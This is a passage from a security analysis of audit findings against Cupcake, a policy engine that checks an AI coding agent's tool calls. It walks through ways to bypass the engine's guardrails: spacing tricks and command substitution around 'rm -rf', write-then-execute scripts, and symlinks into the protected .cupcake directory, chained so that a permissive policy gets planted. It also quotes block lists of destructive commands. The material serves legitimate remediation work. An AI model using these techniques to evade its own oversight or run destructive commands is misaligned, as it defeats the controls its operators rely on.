# Cupcake Bypass Vulnerabilities - Deep Understanding

**Date**: 2025-10-20
**Source**: Trail of Bits Security Audit (2025-09)
**Status**: Analysis Complete - Remediation Pending

---

## Executive Summary

Trail of Bits identified **three critical bypass vulnerabilities** (all High severity, Low difficulty) in Cupcake's policy enforcement system. These vulnerabilities stem from a fundamental architectural limitation: **policies use simple string matching on tool inputs rather than semantic understanding of what actions will occur**.

**Critical Finding**: The issues are interconnected and can be chained together for sophisticated bypasses. Current tests only validate "happy path" scenarios where users follow expected patterns, missing these attack vectors entirely.

**Risk Level**: **CRITICAL**
- **Easy to Exploit**: All marked "Low Difficulty"
- **Broad Impact**: Affects all bash command policies and file protection
- **Undermines Trust**: Users believe they're protected when they're not
- **Chainable**: Issues compound when combined

## Vulnerability #3: Bash Command String Matching Bypass

### Finding Details
- **ID**: TOB-EQTY-LAB-CUPCAKE-3
- **Severity**: High
- **Difficulty**: Low
- **Impact**: Dangerous commands can execute despite policy blocks

### Root Cause

Policies use **Rego `contains()` function** for pattern matching on bash commands, which performs **literal substring search** without understanding shell syntax.

**Example from codebase** (`examples/fixtures/security_policy.rego:17-19`):
```rego
dangerous_commands := {"rm -rf", "sudo rm", "format", "fdisk", "> /dev/"}
some cmd in dangerous_commands
contains(input.tool_input.command, cmd)  # ❌ VULNERABLE!
```

**Why it fails:**
```rego
contains("rm -rf /tmp", "rm -rf")         # ✅ TRUE (caught)
contains("rm  -rf /tmp", "rm -rf")        # ❌ FALSE (bypassed - extra space)
contains("$(echo rm) -rf /tmp", "rm -rf") # ❌ FALSE (bypassed - command substitution)
```

### Attack Vectors Demonstrated by Trail of Bits

#### Attack Vector 1: Extra Whitespace (Simplest)

**Policy Intent**: Block `rm -rf` commands

**Bypass Technique**:
```bash
# Normal command (caught by policy):
rm -rf /tmp/testdir

# Bypassed with extra space:
rm  -rf /tmp/testdir
# ↑ Two spaces instead of one

# Also bypassed:
rm    -rf /tmp/testdir  # Multiple spaces
rm -rf  /tmp/testdir    # Space after flags
rm -rf/tmp/testdir      # No space before path
```

**Why it works**: The policy searches for the exact string `"rm -rf"` (with single space). Any variation in whitespace causes the match to fail.

#### Attack Vector 2: Command Substitution

**Bypass Technique**:
```bash
# Bypassed with command substitution:
$(echo "rm") -rf /tmp/testdir

# Variations:
`echo rm` -rf /tmp/testdir          # Backtick syntax
$(printf "rm") -rf /tmp/testdir     # Using printf
"$(cat <<< 'rm')" -rf /tmp/testdir  # Heredoc
```

**Why it works**: The policy checks the literal command string. At evaluation time, the string is `"$(echo "rm") -rf /tmp/testdir"`, which doesn't contain `"rm -rf"` as a substring.

The shell evaluates `$(echo "rm")` to `rm` **after** Cupcake has already approved the command.

#### Attack Vector 3: Inline Function Definitions

**Bypass Technique**:
```bash
# Bypassed with inline function:
myalias() { rm "$@"; }; myalias -rf /tmp/testdir

# Variations:
function myalias { rm "$@"; }; myalias -rf /tmp/testdir
myalias() { command rm "$@"; }; myalias -rf /tmp/testdir
```

**Why it works**:
1. The policy searches for `"rm -rf"` as a substring
2. In the function definition, `rm` and `-rf` are in **different parts** of the command:
   - `rm` is in the function body: `{ rm "$@"; }`
   - `-rf` is in the function call: `myalias -rf`
3. They never appear together as `"rm -rf"`, so the check fails

The `-rf` flag is passed through `"$@"` to the `rm` command inside the function, achieving the same effect without triggering the policy.

### Code Locations Affected

**1. Git No-Verify Builtin** (`fixtures/claude/builtins/git_block_no_verify.rego:34-39`)
```rego
contains_git_no_verify(cmd) if {
    contains(cmd, "git")
    contains(cmd, "commit")
    contains(cmd, "--no-verify")  # ❌ Vulnerable to: git  commit  --no-verify
}
```

**Bypass**:
```bash
git  commit  --no-verify  # Extra spaces
$(echo git) commit --no-verify  # Command substitution
```

**2. Rulebook Security Guardrails** (`fixtures/claude/builtins/rulebook_security_guardrails.rego:91-93`)
```rego
contains_cupcake_modification_pattern(cmd) if {
    contains(cmd, ".cupcake")  # ❌ Basic check, vulnerable
}
```

**Bypass**:
```bash
rm -rf .cupcake  # Caught
rm  -rf  .cupcake  # Bypassed with extra spaces
$(echo rm) -rf .cupcake  # Bypassed with substitution
```

**3. Example Security Policy** (`examples/fixtures/security_policy.rego:17-19`)
```rego
dangerous_commands := {"rm -rf", "sudo rm", "format", "fdisk", "> /dev/"}
some cmd in dangerous_commands
contains(input.tool_input.command, cmd)  # ❌ Vulnerable pattern
```

### Why Tests Don't Catch This

**Current Tests** (`cupcake-core/tests/rulebook_security_integration.rs:119`):
```rust
"command": "rm -rf .cupcake/policies/*"  // ✅ Normal spacing - caught by policy
```

**Missing Test Cases**:
```rust
// ❌ NOT TESTED:
"command": "rm  -rf .cupcake/policies/*"           // Extra space
"command": "$(echo rm) -rf .cupcake/policies/*"    // Command substitution
"command": "f() { rm \"$@\"; }; f -rf .cupcake/*"  // Function bypass
"command": "`echo rm` -rf .cupcake/*"              // Backtick substitution
```

### Technical Deep Dive

**Rego `contains()` Semantics**:
```rego
# From Rego documentation:
contains(string, search) = true if search is a substring of string

# Examples:
contains("hello world", "world")     # true
contains("hello  world", "o w")      # true - matches "o w" in "lo  w"
contains("hello  world", "o world")  # false - "o world" with one space doesn't match two spaces
```

**Why String Matching Fails for Shell Commands**:

Shell syntax has:
- **Flexible whitespace**: Shells ignore extra spaces (mostly)
- **Variable expansion**: `$VAR`, `${VAR}`, `$(command)`
- **Quote variations**: `'rm'`, `"rm"`, `r''m`, `$'rm'`
- **Indirect execution**: Functions, aliases, `eval`, `exec`
- **Concatenation**: `r''m`, `rm''`, `'r'm`

Rego `contains()` treats all of these as **different strings**, but the shell treats them as **equivalent commands**.

---

## Vulnerability #2: Cross-Tool Bypass

### Finding Details
- **ID**: TOB-EQTY-LAB-CUPCAKE-2
- **Severity**: High
- **Difficulty**: Low
- **Impact**: Security policies can be completely circumvented

### Root Cause

The **metadata-driven routing system** is designed for performance (O(1) lookups) but creates a fundamental security gap: **policies are tool-specific and evaluate in isolation**.

**Architectural Design** (`cupcake-core/src/engine/metadata.rs`):
```rego
# METADATA
# custom:
#   routing:
#     required_events: ["PreToolUse"]
#     required_tools: ["Bash"]  # ❌ Only routes Bash events to this policy!
```

**Consequence**: A policy blocking `rm` in Bash **cannot see** or **prevent** the equivalent operation through Write/Edit/MultiEdit tools.

### How Routing Works (and Creates the Gap)

**Routing Key Generation** (`cupcake-core/src/engine/routing.rs:13-35`):
```rust
pub fn create_routing_key_from_metadata(directive: &RoutingDirective) -> Vec<String> {
    let mut keys = Vec::new();
    for event in &directive.required_events {
        for tool in &directive.required_tools {
            keys.push(format!("{event}:{tool}"));  // Creates tool-specific routes
        }
    }
    keys
}
```

**Result**:
- Policy A: `required_tools: ["Bash"]` → Routes to key `"PreToolUse:Bash"`
- Policy B: `required_tools: ["Write"]` → Routes to key `"PreToolUse:Write"`
- **No overlap**: Bash events never trigger Write policies, and vice versa

**Evaluation Flow** (`cupcake-core/src/engine/mod.rs:420-450`):
```
Event: PreToolUse with tool_name="Bash"
  ↓
Routing Map Lookup: "PreToolUse:Bash"
  ↓
Returns: [policies with required_tools: ["Bash"]]
  ↓
Evaluation: ONLY Bash-specific policies run
  ↓
Decision: Write/Edit policies NEVER see this event
```

### Attack Vector 1: Script Creation Bypass

**Policy Configuration**:
```rego
# Policy blocks rm in Bash
deny contains decision if {
    input.tool_name == "Bash"  # ❌ Only checks Bash tool!
    contains(input.tool_input.command, "rm")
    decision := {
        "rule_id": "SECURITY-001",
        "reason": "Dangerous command blocked: rm",
        "severity": "CRITICAL"
    }
}
```

**Bypass Sequence**:

**Step 1**: Use **Write tool** to create malicious script
```json
{
  "tool_name": "Write",
  "tool_input": {
    "file_path": "script.sh",
    "content": "#!/bin/bash\nrm -rf /tmp/testdir"
  }
}
```
- Policy routing: `"PreToolUse:Write"` → No Bash policy matches
- Decision: **Allow** (no policy blocks file creation)

**Step 2**: Use **Bash tool** to make script executable
```json
{
  "tool_name": "Bash",
  "tool_input": {
    "command": "chmod +x script.sh"
  }
}
```
- Policy check: Does command contain `"rm"`? No, contains `"chmod"`
- Decision: **Allow**

**Step 3**: Use **Bash tool** to execute script
```json
{
  "tool_name": "Bash",
  "tool_input": {
    "command": "./script.sh"
  }
}
```
- Policy check: Does command contain `"rm"`? No, contains `"./script.sh"`
- Decision: **Allow**

**Result**: `rm -rf /tmp/testdir` executes despite policy supposedly blocking `rm`

### Attack Vector 2: File Modification Bypass

**Policy Configuration**:
```rego
# Policy blocks Edit tool on protected paths
deny contains decision if {
    input.tool_name == "Edit"  # ❌ Only blocks Edit!
    startswith(input.tool_input.file_path, "/tmp/forbiddendir/")
    decision := {
        "rule_id": "SECURITY-002",
        "reason": "System file modification blocked",
        "severity": "HIGH"
    }
}
```

**Direct Edit Attempt** (blocked):
```json
{
  "tool_name": "Edit",
  "tool_input": {
    "file_path": "/tmp/forbiddendir/testfile",
    "old_string": "old",
    "new_string": "new"
  }
}
```
- Policy routing: `"PreToolUse:Edit"` → Edit policy matches
- Decision: **Deny** ✓ (Policy works as intended)

**Bypass via Bash Tool**:
```json
{
  "tool_name": "Bash",
  "tool_input": {
    "command": "echo \"abcde\" >> /tmp/forbiddendir/testfile"
  }
}
```
- Policy routing: `"PreToolUse:Bash"` → Edit policy **doesn't match**
- No Bash policy exists to check path protection
- Decision: **Allow** ✗ (Policy bypassed)

**Result**: File modified despite policy protecting the path

### Why This is Fundamental

**Design Philosophy Conflict**:

**Performance Optimization** (Current):
```
Goal: O(1) routing via HashMap lookups
Method: Policies declare specific tools they care about
Result: Fast evaluation, tool isolation
```

**Security Requirement** (Needed):
```
Goal: Prevent unauthorized actions regardless of tool
Method: Policies express intent ("no file deletion") not tool ("no Bash rm")
Result: Cross-tool coverage, semantic understanding
```

**The Gap**: Current architecture optimizes for performance by **narrowing scope**, but security requires **broadening scope** to catch equivalent operations across tools.

### Code Locations Affected

**1. Protected Paths Builtin** (`fixtures/claude/builtins/protected_paths.rego:14-62`)

Separate rules for different tools:
```rego
# Lines 14-37: Block WRITE tools
halt contains decision if {
    write_tools := {"Edit", "Write", "MultiEdit", "NotebookEdit"}
    input.tool_name in write_tools
    # ...
}

# Lines 40-62: Block Bash commands (separate rule!)
halt contains decision if {
    input.tool_name == "Bash"
    # ...
}
```

**Gap**: What if a tool is added (e.g., `Task` that can spawn sub-agents)? Policy must be updated to include it.

**2. Example Security Policy** (`examples/fixtures/security_policy.rego:14-25, 61-71`)

Two separate rules for Bash and Edit:
```rego
# Lines 14-25: Bash rule
deny contains decision if {
    input.tool_name == "Bash"
    contains(input.tool_input.command, "rm -rf")
}

# Lines 61-71: Edit rule (completely separate!)
deny contains decision if {
    input.tool_name == "Edit"
    startswith(input.tool_input.file_path, "/etc/")
}
```

**Gap**: If you want to protect `/etc/` from modification, you must:
- Block Edit tool on `/etc/` paths
- Block Write tool on `/etc/` paths
- Block MultiEdit tool on `/etc/` paths
- Block Bash commands: `>`, `>>`, `tee`, `sed -i`, `perl -i`, etc. on `/etc/`
- Block NotebookEdit on `/etc/` paths
- Block any future tools that can modify files

**This is unmaintainable and error-prone.**

### Why Tests Don't Catch This

**Current Test Philosophy**: Tests validate **single events** in isolation

**Example** (`cupcake-core/tests/protected_paths_integration.rs:62-103`):
```rust
// Test 1: Block Write tool ✓
let write_event = json!({
    "tool_name": "Write",
    "file_path": "production.env"
});
let decision = engine.evaluate(&write_event, None).await?;
assert!(matches!(decision, FinalDecision::Halt { .. }));

// Test 2: Allow Read tool ✓
let read_event = json!({
    "tool_name": "Read",
    "file_path": "production.env"
});
let decision = engine.evaluate(&read_event, None).await?;
assert!(matches!(decision, FinalDecision::Allow { .. }));
```

**Missing Test Patterns**:
```rust
// ❌ NOT TESTED: Multi-step attack sequences

// Step 1: Write creates malicious script
let write_event = json!({
    "tool_name": "Write",
    "file_path": "evil.sh",
    "content": "rm production.env"
});
engine.evaluate(&write_event, None).await?;  // Should this be allowed?

// Step 2: Bash executes script
let bash_event = json!({
    "tool_name": "Bash",
    "command": "bash evil.sh"
});
engine.evaluate(&bash_event, None).await?;  // Should this be blocked?

// Result: production.env deleted despite being "protected"
```

```rust
// ❌ NOT TESTED: Cross-tool equivalence

// Block Edit on protected path
let edit_event = json!({
    "tool_name": "Edit",
    "file_path": "protected.txt"
});
// Expect: Deny

// But Bash achieves same result
let bash_event = json!({
    "tool_name": "Bash",
    "command": "echo 'modified' > protected.txt"
});
// What happens? Should also be Deny, but policy may not catch it
```

### Trail of Bits Recommendation

> **Short term**, provide guidance to the user on policy best practices. For example, best practice may dictate an allow list as the recommended means to enable the agent without requiring complex multi tool disallow policies.

**Implication**: Trail of Bits recognizes this is an **architectural limitation** that can't be easily fixed. Their recommendation is to:
1. Document the limitation clearly
2. Recommend **allowlist approach** instead of denylists
3. Accept that comprehensive protection requires policies for **every tool**

---

## Vulnerability #4: Symbolic Link Path Bypass

### Finding Details
- **ID**: TOB-EQTY-LAB-CUPCAKE-4
- **Severity**: High
- **Difficulty**: Low
- **Impact**: Protected directories can be modified through symlinks

### Root Cause

Path protection uses **string matching on literal paths** without resolving symbolic links before validation.

**Vulnerable Pattern** (`fixtures/claude/builtins/rulebook_security_guardrails.rego:63-67`):
```rego
targets_cupcake_directory(file_path) if {
    # Direct .cupcake/ reference (case-insensitive)
    lower_path := lower(file_path)
    contains(lower_path, ".cupcake/")  # ❌ Checks string, not resolved path!
}
```

**The Core Problem**: Policies operate on **JSON input strings**, not **resolved filesystem paths**.

### How the Bypass Works

**The Flow**:
```
AI Agent → Proposes Action → Cupcake → Checks Path String → Returns Decision → Agent Executes
                                ↓                                             ↓
                         "foo/test.txt"                              Real path: .cupcake/test.txt
                         (symlink!)                                  (symlink resolved by shell)
```

**Cupcake sees**: The path string from JSON input: `"foo/test.txt"`
**Filesystem sees**: The resolved path after symlink: `.cupcake/test.txt`

**There's a TOCTOU (Time-Of-Check-Time-Of-Use) gap**, but worse: the check happens on **different data** than what's ultimately used.

### Attack Vector: Complete Bypass Sequence

**Initial State**: `.cupcake/` directory protected by policy

**Step 1: Create Symbolic Link**

Agent command:
```bash
ln -s .cupcake foo
```

Policy evaluation:
```json
{
  "tool_name": "Bash",
  "tool_input": {
    "command": "ln -s .cupcake foo"
  }
}
```

Policy check (`rulebook_security_guardrails.rego:44-60`):
```rego
halt contains decision if {
    input.tool_name == "Bash"
    command := lower(input.tool_input.command)
    contains_cupcake_modification_pattern(command)  # Does command modify .cupcake?
}

contains_cupcake_modification_pattern(cmd) if {
    contains(cmd, ".cupcake")  # ✓ TRUE - command contains ".cupcake"

    dangerous_patterns := {"rm ", "mv ", "cp ", ...}
    some pattern in dangerous_patterns
    contains(cmd, pattern)  # ✗ FALSE - "ln -s" not in dangerous_patterns!
}
```

**Result**: Command **allowed** because `ln` is not in the dangerous patterns list.

**Why**: The policy assumes listing dangerous operations like `rm`, `mv`, `cp` is sufficient. Creating symlinks (`ln -s`) is not considered "dangerous" by the policy.

**Step 2: Write Through Symlink**

Agent command:
```bash
echo "hi" > foo/test.txt
```

Policy evaluation:
```json
{
  "tool_name": "Bash",
  "tool_input": {
    "command": "echo \"hi\" > foo/test.txt"
  }
}
```

Policy check:
```rego
contains_cupcake_modification_pattern(cmd) if {
    contains(cmd, ".cupcake")  # ✗ FALSE - command contains "foo", not ".cupcake"
}
```

**Result**: Command **allowed** because the string `".cupcake"` doesn't appear in the command.

**Actual Effect**: File created at `.cupcake/test.txt` (through the `foo` symlink)

**Step 3: Ongoing Exploitation**

Now that `foo` symlink exists, **every operation** through it bypasses protection:
```bash
echo "two" > foo/test2.txt        # Writes to .cupcake/test2.txt
rm foo/test.txt                    # Deletes .cupcake/test.txt
cat foo/policies/policy.rego       # Reads .cupcake/policies/policy.rego
```

All bypass because the path string checked is `"foo/*"`, not `".cupcake/*"`.

### Why Path Normalization Doesn't Help

The policy includes **sophisticated path normalization** (`rulebook_security_guardrails.rego:82-87`):
```rego
targets_cupcake_directory(file_path) if {
    lower_path := lower(file_path)
    normalized := regex.replace(lower_path, `/{2,}`, "/")         # Replace multiple slashes
    normalized_clean := regex.replace(normalized, `/\./`, "/")   # Remove /./ segments
    contains(normalized_clean, ".cupcake")
}
```

**What it catches**:
- `.cupcake/file.txt` → Blocked ✓
- `.//cupcake/file.txt` → Normalized to `.cupcake/file.txt` → Blocked ✓
- `././.cupcake/file.txt` → Normalized to `.cupcake/file.txt` → Blocked ✓
- `/absolute/path/.cupcake/file.txt` → Contains `.cupcake` → Blocked ✓

**What it misses**:
- `foo/file.txt` where `foo → .cupcake` (symlink) → **Allowed** ✗
- `../project/.cupcake/file.txt` from different directory → May bypass depending on context
- Hard links to `.cupcake/` files → **Allowed** ✗

**Why normalization fails**: It's still **string manipulation**. It can clean up path syntax but cannot resolve filesystem semantics (symlinks, hard links, mount points).

### The WASM Constraint

**Why Policies Can't Resolve Paths**:

Policies run in **WASM sandbox** (`cupcake-core/src/engine/wasm_runtime.rs:434-439`):
```rust
self.wasm_runtime = Some(wasm_runtime::WasmRuntime::new_with_config(
    &wasm_bytes,
    "cupcake.system",
    self.config.wasm_max_memory,
)?);
```

**WASM Security Model**:
- No access to filesystem APIs
- No native system calls
- Can only process data passed as input
- Cannot call `realpath()`, `canonicalize()`, or `readlink()`

**Policy Receives**:
```json
{
  "tool_input": {
    "file_path": "foo/test.txt"  // ← This is ALL the policy sees
  }
}
```

**What Policy Cannot Do**:
```rego
# ❌ IMPOSSIBLE in WASM:
real_path := resolve_symlink(file_path)      # No filesystem access
is_symlink := check_if_symlink(file_path)    # No stat() call
target := readlink(file_path)                # No system calls
```

**The Only Option**: String matching on the input path, which is fundamentally vulnerable to symlink attacks.

### Could Signals Help?

**Theoretical Approach**: Use a signal to resolve paths

```yaml
# Hypothetical rulebook.yml
signals:
  resolved_path:
    command: "realpath -s \"$FILE_PATH\""  # Resolve symlinks
```

**Problems**:
1. **Performance**: Every file operation needs external signal execution
2. **Complexity**: How to pass file path to signal? Not supported in current architecture
3. **Race Condition**: Path could change between signal execution and agent execution
4. **Security**: Signal script itself could be compromised

**Current Signal Architecture** (`cupcake-core/src/engine/rulebook.rs:157-199`):
- Signals execute **before** policy evaluation
- Signals are **predefined** in rulebook, not dynamically generated per event
- Signals return **static results**, not parameterized queries

**This doesn't fit** the use case of "resolve this specific file path from this specific event".

### Code Locations Affected

**1. Rulebook Security Guardrails** (`fixtures/claude/builtins/rulebook_security_guardrails.rego:189-215`)

File path extraction:
```rego
get_file_path_from_tool_input := path if {
    path := input.tool_input.file_path  # ❌ Raw path from JSON input
} else := path if {
    path := input.tool_input.path
} else := path if {
    path := input.tool_input.notebook_path
}
```

**No resolution happens here** - just extracting the string from input.

**2. Protected Paths Builtin** (`fixtures/claude/builtins/protected_paths.rego:65-76`)

Same pattern:
```rego
get_file_path_from_tool_input := path if {
    path := input.tool_input.file_path  # ❌ No symlink resolution
}
```

**3. Path Matching Logic** (`fixtures/claude/builtins/protected_paths.rego:86-109`)

Sophisticated matching that still operates on strings:
```rego
path_matches(path, pattern) if {
    # Directory prefix match
    endswith(pattern, "/")
    startswith(lower(path), lower(pattern))  # ❌ String comparison
}

path_matches(path, pattern) if {
    # Glob pattern matching
    contains(pattern, "*")
    glob_match(lower(path), lower(pattern))  # ❌ Still string-based
}
```

All comparisons are on the **input string** `"foo/test.txt"`, not the resolved path `".cupcake/test.txt"`.

### Why Tests Don't Catch This

**Current Tests** (`cupcake-core/tests/rulebook_security_integration.rs:63-85`):

```rust
// Test blocks direct .cupcake reference ✓
let edit_event = json!({
    "tool_name": "Edit",
    "tool_input": {
        "file_path": ".cupcake/policies/example.rego"  // Direct reference
    }
});
let decision = engine.evaluate(&edit_event, None).await?;
assert!(matches!(decision, FinalDecision::Halt { .. }));
```

**Missing Test Cases**:
```rust
// ❌ NOT TESTED: Symlink creation
let symlink_create = json!({
    "tool_name": "Bash",
    "command": "ln -s .cupcake foo"
});
// Should this be blocked?

// ❌ NOT TESTED: Operation through symlink
let write_through_symlink = json!({
    "tool_name": "Write",
    "file_path": "foo/test.txt"  // foo is symlink to .cupcake
});
// Should recognize foo → .cupcake and block

// ❌ NOT TESTED: Hard links
let hard_link = json!({
    "tool_name": "Bash",
    "command": "ln .cupcake/rulebook.yml hardlink.yml"
});
// Create hard link to protected file - should this be blocked?

// ❌ NOT TESTED: Relative path traversal
let traversal = json!({
    "tool_name": "Edit",
    "file_path": "other/../.cupcake/policies/test.rego"
});
// Normalized this might work, but combined with symlinks?
```

### Trail of Bits Recommendation

> **Short term**, require strict Unix permissions on the `.cupcake` directory to prevent modification.

**Implication**: Trail of Bits recognizes this is **beyond policy engine capabilities**. Their recommendation is to rely on **operating system security** (filesystem permissions) rather than application-level policies.

**This is an admission** that Cupcake policies **cannot reliably protect paths** when adversarial techniques are used.

## Interconnected Attack Patterns

The three vulnerabilities are not isolated - they can be **chained together** for sophisticated, multi-stage bypasses.

### Chain 1: Cross-Tool + String Matching

**Exploit Technique**: Use Write tool to create a script with obfuscated commands, then execute via Bash.

**Attack Sequence**:

**Step 1**: Create script with **extra spaces** (Issue #3)
```json
{
  "tool_name": "Write",
  "tool_input": {
    "file_path": "cleanup.sh",
    "content": "#!/bin/bash\nrm    -rf    /protected/dir"
  }
}
```

Policy evaluation:
- Routes to: `PreToolUse:Write`
- No Bash policy checks file content
- Command pattern `"rm -rf"` is in file content, but policy only checks Bash `tool_input.command`
- **Decision: Allow** ✗

**Step 2**: Execute script
```json
{
  "tool_name": "Bash",
  "tool_input": {
    "command": "bash cleanup.sh"
  }
}
```

Policy evaluation:
- Routes to: `PreToolUse:Bash`
- Check: Does `"bash cleanup.sh"` contain `"rm -rf"`? No.
- **Decision: Allow** ✗

**Result**:
- `rm -rf /protected/dir` executes with extra spaces
- Bypasses both **tool isolation** (Issue #2) and **string matching** (Issue #3)

### Chain 2: Cross-Tool + Symlink

**Exploit Technique**: Use Write tool to create script that creates symlink, then write through symlink.

**Attack Sequence**:

**Step 1**: Create symlink-creation script
```json
{
  "tool_name": "Write",
  "tool_input": {
    "file_path": "make_link.sh",
    "content": "#!/bin/bash\nln -s .cupcake alias"
  }
}
```
- **Decision: Allow** (Write tool, no Bash policy checks content)

**Step 2**: Execute script to create symlink
```json
{
  "tool_name": "Bash",
  "tool_input": {
    "command": "bash make_link.sh"
  }
}
```
- Policy check: `contains("bash make_link.sh", ".cupcake")` → False
- **Decision: Allow**

**Step 3**: Write through symlink using Write tool
```json
{
  "tool_name": "Write",
  "tool_input": {
    "file_path": "alias/malicious.rego",
    "content": "package malicious\nimport rego.v1\nallow := true"
  }
}
```
- Routes to: `PreToolUse:Write`
- Path check: Does `"alias/malicious.rego"` contain `".cupcake"`? No.
- **Decision: Allow** ✗

**Result**: Malicious policy written to `.cupcake/policies/malicious.rego`, bypassing all protection.

### Chain 3: All Three Combined

**Exploit Technique**: Multi-stage attack using Write, obfuscation, and symlinks.

**Attack Sequence**:

**Step 1**: Create script with obfuscated symlink and write operations
```json
{
  "tool_name": "Write",
  "tool_input": {
    "file_path": "exploit.sh",
    "content": "#!/bin/bash\nln  -s  .cupcake  temp\necho  'malicious'  >  temp/backdoor.sh"
  }
}
```
- Cross-tool bypass: Write tool, no Bash content inspection
- **Decision: Allow**

**Step 2**: Execute multi-stage exploit
```json
{
  "tool_name": "Bash",
  "tool_input": {
    "command": "bash exploit.sh"
  }
}
```

Policy checks:
- Check 1: `contains("bash exploit.sh", ".cupcake")` → False
- Check 2: `contains("bash exploit.sh", "rm")` → False
- **Decision: Allow** ✗

**Result**:
- Symlink `temp → .cupcake` created (symlink bypass)
- File created at `.cupcake/backdoor.sh` (symlink bypass)
- Extra spaces in script bypass string matching (string matching bypass)
- Write tool used to create exploit (cross-tool bypass)

**All three vulnerabilities exploited in one attack sequence.**

## Systemic Root Causes

These vulnerabilities are not simple bugs - they stem from **fundamental architectural decisions** in Cupcake's design.

### 1. Performance vs. Security Trade-off

**Design Choice: Optimize for Performance**

The Hybrid Model architecture prioritizes:
- **O(1) routing**: Fast event→policy lookups via HashMap
- **Metadata-driven**: Policies declare tool requirements explicitly
- **Stateless evaluation**: Each event evaluated independently
- **WASM sandbox**: Policies run in isolated environment

**From Architecture Documentation** (`docs/reference/architecture.md:36-38`):
```
This separation provides:
- Policy Portability: Rego policies are platform-independent WASM modules
- Engine Intelligence: Rust handles optimization, routing, and orchestration
- Clear Separation: Policies focus on business logic, engine focuses on performance
```

**Security Consequences**:
- Tool-specific routing **prevents cross-tool analysis**
- WASM sandbox **prevents filesystem introspection** (can't resolve symlinks)
- Stateless evaluation **prevents tracking multi-step attacks**
- Performance optimization **prioritizes speed over comprehensiveness**

### 2. String-Based Pattern Matching

**Design Choice: Use Rego `contains()` for Command Checking**

**Why This Was Chosen**:
- Simple to implement in Rego
- No external dependencies (shell parser)
- Works in WASM sandbox (pure string operations)
- Fast execution (substring search is O(n))

**From Policy Examples** (`examples/fixtures/security_policy.rego:14-25`):
```rego
deny contains decision if {
    input.tool_name == "Bash"
    dangerous_commands := {"rm -rf", "sudo rm", "format"}
    some cmd in dangerous_commands
    contains(input.tool_input.command, cmd)
}
```

**This pattern is documented in user guides** as the standard way to write bash command policies.

**Why It's Fundamentally Flawed**:

Shell command syntax is **context-free grammar**, not simple strings:
- Whitespace is mostly insignificant: `rm -rf` ≡ `rm  -rf` ≡ `rm    -rf`
- Variable expansion: `$VAR`, `${VAR}`, `$(cmd)`, `` `cmd` ``
- Quoting: `'cmd'`, `"cmd"`, `c''md`, `$'cmd'`
- Indirection: functions, aliases, `eval`, `source`
- Operators: `;`, `&&`, `||`, `|`, `&`

**Correct approach requires**:
- Full shell parser (bash/zsh syntax)
- AST construction and analysis
- Semantic understanding of command execution

**None of this is available** in the WASM sandbox or Rego standard library.

### 3. Tool-Isolated Evaluation Model

**Design Choice: Route Events to Tool-Specific Policies**

**From Engine Code** (`cupcake-core/src/engine/routing.rs:45-50`):
```rust
pub fn create_event_key(event_name: &str, tool_name: Option<&str>) -> String {
    match tool_name {
        Some(tool) => format!("{event_name}:{tool}"),  // Tool-specific key
        None => event_name.to_string(),
    }
}
```

**Evaluation Flow**:
```
Event: PreToolUse, tool_name: "Bash"
  ↓
Create key: "PreToolUse:Bash"
  ↓
Lookup policies: Only those with required_tools: ["Bash"]
  ↓
Evaluate: Bash-specific policies only
  ↓
Result: Write/Edit policies never see this event
```

**Why This Causes Cross-Tool Bypass**:

Policies cannot express **intent** (e.g., "prevent file deletion"), only **tool restrictions** (e.g., "block Bash rm command").

**To protect a directory from modification**, users must write policies for:
- `Bash`: Block `rm`, `mv`, `>`, `>>`, `tee`, `sed -i`, etc.
- `Write`: Block file_path matching directory
- `Edit`: Block file_path matching directory
- `MultiEdit`: Block edits with file_path matching directory
- `NotebookEdit`: Block notebook_path matching directory
- `Task`: Block task prompts mentioning directory (agent could spawn sub-agent)

**This is an N×M problem**:
- N = number of intents to protect (directories, files, operations)
- M = number of tools that could violate each intent

**Current architecture requires N×M policies** instead of N policies.

### 4. WASM Sandbox Limitations

**Design Choice: Execute Policies in WASM Sandbox**

**From Engine Initialization** (`cupcake-core/src/engine/mod.rs:434-439`):
```rust
self.wasm_runtime = Some(wasm_runtime::WasmRuntime::new_with_config(
    &wasm_bytes,
    "cupcake.system",
    self.config.wasm_max_memory,
)?);
```

**Security Benefits**:
- Sandboxed execution (untrusted policy code can't harm system)
- Memory limits prevent DoS
- No network access
- Portable across platforms

**Security Costs**:
- **No filesystem access** → Cannot resolve symlinks
- **No system calls** → Cannot validate paths actually exist
- **No native code** → Cannot use OS-specific security APIs
- **Limited standard library** → No shell parser, regex is basic

**The Constraint**:

Policies receive **JSON input** with string paths:
```json
{
  "tool_input": {
    "file_path": "foo/bar.txt"
  }
}
```

Policies **cannot determine**:
- Is `foo` a symlink to `.cupcake`?
- Does `foo/bar.txt` actually exist?
- What are the filesystem permissions on this path?
- Is this a hard link to a protected file?

**All security decisions must be made on strings alone**, which is fundamentally insufficient for path protection.

### 5. Stateless Event Evaluation

**Design Choice: Evaluate Each Event Independently**

**From Architecture** (`docs/reference/architecture.md:70-80`):
```
Every event follows this deterministic flow:

1. Route (O(1) metadata lookup)
2. Gather Signals (proactive)
3. Evaluate (WASM via cupcake.system.evaluate)
4. Synthesize (apply priority hierarchy)
5. Execute Actions (async, non-blocking)
6. Format Response
```

**No session state maintained** between evaluations.

**Why This Enables Multi-Step Attacks**:

Attack sequence:
1. Event 1: Write creates `exploit.sh` → Evaluated independently → Allowed
2. Event 2: Bash executes `chmod +x exploit.sh` → Evaluated independently → Allowed
3. Event 3: Bash executes `./exploit.sh` → Evaluated independently → Allowed

**Policies cannot**:
- Remember that `exploit.sh` was just created
- Correlate that file creation + execution is suspicious pattern
- Track cumulative effect across multiple events
- Maintain state about symlinks created in previous events

**Each decision is made** as if it's the only operation happening, with no context about what came before or what might come after.

### 6. Missing Semantic Understanding

**Design Gap: No Understanding of Operation Semantics**

Policies know:
- Tool name: `"Bash"`
- Command string: `"bash script.sh"`

Policies **don't know**:
- What will `script.sh` actually do?
- Does `script.sh` contain dangerous commands?
- Will executing this create, modify, or delete files?
- What is the **semantic effect** of this operation?

**Example**:

These are all semantically equivalent (delete file), but look completely different to string matching:
```bash
rm file.txt                     # Direct command
bash -c "rm file.txt"          # Shell execution
python -c "import os; os.remove('file.txt')"  # Python
node -e "require('fs').unlinkSync('file.txt')"  # Node.js
cat /dev/null > file.txt       # Truncation (effectively deletion)
> file.txt                      # Redirection to empty
truncate -s 0 file.txt         # Truncate to zero
```

**Policies using string matching will catch some but miss others.**

**What's needed**: Semantic understanding of "this operation will delete file.txt" regardless of syntax.

**Why it's missing**: Requires:
- Dynamic analysis (actually running code to see what it does) - dangerous
